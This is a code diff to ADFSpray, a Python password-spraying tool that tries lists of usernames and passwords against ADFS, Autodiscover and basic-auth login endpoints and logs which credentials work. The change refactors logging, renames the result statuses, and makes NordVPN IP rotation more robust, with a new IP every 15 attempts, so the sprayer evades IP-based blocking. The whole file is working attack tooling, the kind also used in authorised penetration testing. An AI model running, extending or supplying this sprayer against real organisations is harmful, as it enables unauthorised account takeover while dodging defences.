@@ -5,18 +5,14 @@
 import argparse
 import csv
 import datetime
-import logging
 import sys
 import time
 import urllib
 import urllib.parse
-import urllib.request
 from random import randint
-import os
-from nordvpn_switcher import initialize_VPN,rotate_VPN,terminate_VPN
-
+from nordvpn_switcher import initialize_VPN,terminate_VPN
+from utils import configure_logger, safe_rotate_vpn, get_public_ip
 import requests
-from colorlog import ColoredFormatter
 from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
 from requests_ntlm import HttpNtlmAuth
 
@@ -65,41 +61,6 @@ def args_parse():
     
     parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
     return parser.parse_args()
-
-
-def configure_logger(verbose):  # This function is responsible to configure logging object.
-
-    global LOGGER
-    LOGGER = logging.getLogger("ADFSpray")
-    # Set logging level
-    try:
-        if verbose:
-            LOGGER.setLevel(logging.DEBUG)
-        else:
-            LOGGER.setLevel(logging.INFO)
-    except Exception as logger_err:
-        excptn(logger_err)
-
-    # Create console handler
-    log_colors = {
-        'DEBUG': 'bold_red',
-        'INFO': 'green',
-        'WARNING': 'yellow',
-        'ERROR': 'red',
-        'CRITICAL': 'red',
-    }
-    formatter = "%(log_color)s[%(asctime)s] - %(message)s%(reset)s"
-    formatter = ColoredFormatter(formatter, datefmt='%d-%m-%Y %H:%M', log_colors=log_colors)
-    ch = logging.StreamHandler(sys.stdout)
-    ch.setFormatter(formatter)
-    LOGGER.addHandler(ch)
-
-    # Create log-file handler
-    log_filename = "ADFSpray." + datetime.datetime.now().strftime('%d-%m-%Y') + '.log'
-    fh = logging.FileHandler(filename=log_filename, mode='a')
-    fh.setLevel(logging.DEBUG)
-    fh.setFormatter(formatter)
-    LOGGER.addHandler(fh)
 
 
 def excptn(e):
@@ -153,12 +114,12 @@ def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, ran
                     response = session.get(target)
                     #  Currently checking only if working or not, need to add more tests in the future
                     if response.status_code == 200:
-                        status = 'Valid creds'
+                        status = 'SUCCESS'
                         output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        status = 'Invalid'
+                        status = 'FAIL'
                         if verbose:
                             output(status, username, password, target, output_file_name)
                         LOGGER.debug("[-]Creds failed for: %s" % username)
@@ -197,12 +158,12 @@ def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, 
                                        headers={'User-Agent': 'Microsoft'}, verify=False)
                     #  Currently checking only if working or not, need to add more tests in the future
                     if req.status_code == 200:
-                        status = 'Valid creds'
+                        status = 'SUCCESS'
                         output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        status = 'Invalid'
+                        status = 'FAIL'
                         if verbose:
                             output(status, username, password, target, output_file_name)
                         LOGGER.debug("[-]Creds failed for: %s" % username)
@@ -227,9 +188,10 @@ def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, 
         excptn(e)
 
 
-def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose, vpn):
+def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose, vpn, initial_ip=None):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     username_counter = 0
+    prev_ip = initial_ip
 
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
@@ -238,13 +200,14 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
-                    if vpn and username_counter%20==0:
-                        rotate_VPN()
-                        try:
-                            ip = requests.get("https://ifconfig.me").content.decode('utf-8')
-                            print(f"My IP is {ip}")
-                        except:
-                            pass
+                    if vpn and username_counter % 15 == 0:
+                        new_ip = safe_rotate_vpn(prev_ip=prev_ip, rotate_retries=4)
+                        if new_ip:
+                            prev_ip = new_ip
+                            LOGGER.debug(f"[VPN] Using IP {prev_ip}")
+                        else:
+                            LOGGER.warning("[VPN] Rotation failed — exiting")
+                            sys.exit(1)
 
                     target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
                                  "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
@@ -262,12 +225,12 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
                     #  Currently checking only if working or not, need to add more tests in the future
 
                     if status_code == 302:
-                        status = 'Valid creds'
+                        status = 'SUCCESS'
                         output(status, username, password, target, output_file_name)
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        status = 'Invalid'
+                        status = 'FAIL'
                         if verbose:
                             output(status, username, password, target, output_file_name)
                         LOGGER.debug("[-]Creds failed for: %s" % username)
@@ -299,7 +262,8 @@ def main():
     random = False
     min_sleep, max_sleep = 0, 0
     usernames_stripped, passwords_stripped, targets_stripped = [], [], []
-    configure_logger(args.verbose)
+    global LOGGER
+    LOGGER = configure_logger(args.verbose)
     vpn = args.vpn
 
     if args.userlist:
@@ -347,7 +311,22 @@ def main():
     LOGGER.info("Total number of attempts: %s" % str(total_attempts))
 
     if vpn:
-        initialize_VPN(save=1,area_input=['Europe'])
+        try:
+            initialize_VPN(save=1, area_input=['France,Germany,Netherlands,United Kingdom'])
+        except Exception as e:
+            LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")
+
+        # --- NEW: capture initial IP and exit if unavailable ---
+        initial_ip = get_public_ip(timeout=5, retries=2)
+        if not initial_ip:
+            LOGGER.critical("[VPN] Could not determine initial public IP after VPN init. Exiting.")
+            try:
+                terminate_VPN()
+            except Exception as e:
+                LOGGER.warning(f"[VPN] terminate_VPN failed while exiting: {e}")
+            sys.exit(1)
+        else:
+            LOGGER.info(f"[VPN] Initial public IP: {initial_ip}")
 
 
     if args.method == 'autodiscover':
@@ -358,7 +337,7 @@ def main():
     elif args.method == 'adfs':
         LOGGER.info("[*] You chose %s method" % args.method)
         adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
-                      args.sleep, random, min_sleep, max_sleep, args.verbose, vpn)
+                      args.sleep, random, min_sleep, max_sleep, args.verbose, vpn, initial_ip=initial_ip)
 
     elif args.method == 'basicauth':
         LOGGER.info("[*] You chose %s method" % args.method)
